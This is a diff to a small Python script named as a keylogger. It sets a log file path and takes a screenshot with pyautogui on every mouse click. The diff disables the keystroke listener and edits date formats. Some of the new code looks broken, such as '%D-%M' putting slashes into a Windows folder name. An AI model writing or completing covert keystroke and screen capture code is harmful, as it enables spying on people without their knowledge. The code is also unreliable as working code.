@@ -4,8 +4,8 @@ from datetime import datetime
 import re, os, pyautogui as pyt
 
 datanow = datetime.now()
-data = datanow.strftime('%d-%m')
-save = r'C:\Users\arthu\Desktop\Save\Content_' + data + '/'
+data = datanow.strftime('%D-%M')
+save = r'C:\Users\arthu\Desktop\Save\Content_' + data + '//'
 arqlog = save + 'keylogger.log'
 
 try:
@@ -20,14 +20,14 @@ def on_click(x, y, button, pressed):
     if pressed:
         Print = pyt.screenshot()
         hora = datetime.now()
-        horaprint = hora.strftime('%h:%m:%s')
+        horaprint = hora.strftime('%H:%M:%S')
         Print.save(os.path.join(save, 'printklp_'+ horaprint +'.jpg'))
 
 
-keyboardListener = KeyboardListener(on_press=on_press)
+#keyboardListener = KeyboardListener(on_press=on_press)
 mouseListener = MouseListener(on_click=on_click)
 
-keyboardListener.start()
+#keyboardListener.start()
 mouseListener.start()
-keyboardListener.join()
+#keyboardListener.join()
 mouseListener.join()
